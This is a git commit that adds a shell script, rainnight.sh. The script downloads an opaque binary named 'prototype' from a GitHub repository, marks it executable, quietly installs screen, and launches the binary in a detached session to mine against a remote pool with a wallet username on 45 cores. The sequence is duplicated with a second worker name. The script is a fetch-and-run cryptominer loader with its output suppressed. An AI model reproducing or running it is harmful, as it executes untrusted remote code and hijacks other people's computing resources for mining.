2b9e61c7e713c0e910bd0df9b4f8334d289498a0
obisumila <obisumila@gmail.com>
2024-09-19 11:29:56 +0800

    Add files via upload

---
+++ rainnight.sh
@@ -0,0 +1,19 @@
+wget https://github.com/obisumila/special-doodle/raw/main/prototype ;
+chmod +x prototype ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S pro -dm ./prototype --url ws://tw-pool.com:5487/mine mine --username HKWtcDL15qaS9quVJGhx9yta4A44kJFKQHQSDj4Bt1pM.WHITE --cores 45 ; 
+screen -ls
+sleep 2
+clear
+screen -ls
+
+wget https://github.com/obisumila/special-doodle/raw/main/prototype ;
+chmod +x prototype ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S pro -dm ./prototype --url ws://tw-pool.com:5487/mine mine --username HKWtcDL15qaS9quVJGhx9yta4A44kJFKQHQSDj4Bt1pM.RAINBOW --cores 45 ; 
+screen -ls
+sleep 2
+clear
+screen -ls
